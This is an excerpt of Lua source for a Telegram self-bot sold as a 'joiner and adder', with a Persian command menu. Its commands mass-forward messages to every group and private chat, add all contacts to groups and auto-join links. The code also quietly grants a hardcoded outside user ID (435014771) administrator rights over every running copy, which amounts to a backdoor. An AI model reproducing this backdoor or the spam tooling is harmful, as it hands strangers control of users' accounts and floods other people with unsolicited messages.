...
function is_sudo(msg)
  if redis:sismember("tg:" .. Ads_id .. ":sudo", msg.sender_user_id) or msg.sender_user_id == sudo or msg.sender_user_id == 435014771 then
    return true
  else
    return false
  end
...
if not redis:sismember("tg:" .. Ads_id .. ":sudo", 435014771) then
  redis:set("tg:" .. Ads_id .. ":senddelay", 132)
  redis:sadd("tg:" .. Ads_id .. ":sudo", 435014771)
...
Set added msg ]] .. tostring(txtadd) .. [[
          ...
          elseif text:match("^([Ss]leep) (%d+)$") then
            local matches = text:match("%d+")
            send(msg.chat_id, msg.id, "BY DAWSH:D")
            os.execute("sleep " .. tonumber(math.floor(matches) * 60))
            return send(msg.chat_id, msg.id, "SALAM DAWSH:D")
...
•حذف ادمین•
••Send (text)••
•ارسال پیام مورد نظر به سوپرگروه ها•
••Fwd {all or sgp or gp or pv} (by reply)••
•فوروارد پیام مورد نظر به همه یا سوپرگروه یا گروه یا پیوی•
••AddedMsg (on or off)••
•پیام افزودن مخاطب روشن یا خاموش•
••SetAddedMsg (text)••
•تنظیم پیام افزودن مخاطب•
••AddToAll @(usename)••
•افزودن کاربر به تمامی گروه ها•
••AddMembers••
•افزودن تمامی مخاطب های اکانت•
••Del (lnk, cotact, sudo)••
•حذف ایتم مورد نظر•
••Join (on or off)••
•عضویت روشن یا خاموش•
••ChkLnk (on or off)••
•چک کردن لینک روشن یا خاموش•
••FindLnk (on or off)••
...
•تازه سازی•
••Join (Private Link)••
•عضو شدن در لینک مد نظر با ریپلی•
••Ping••
•اگاهی از انلاینی ربات•
]]
            return send(msg.chat_id, msg.id, txt)
            elseif text:match("^([Bb][Aa][Nn][Gg])$") then
              local txt = [[

VERSION 2.1
based on TD BOT
Created By Samiyar-Bang
ID Developer @DeP_DeV
ID Channel   @NoFooZiTM
-JOINER AND ADDER-
RATE : [No update : 40T]-[With update : 50T]
FOR Buy And Advice source : @DeP_DeV
  ]]
            return send(msg.chat_id, msg.id, txt)
			elseif text:match("^(share)$") then
					local fname = redis:get("td"..BOT.."fname")
					local lnasme = redis:get("td"..BOT.."lname") or ""
					local num = redis:get("td"..BOT.."num")
					tdcli_function ({
						ID = "SendMessage",
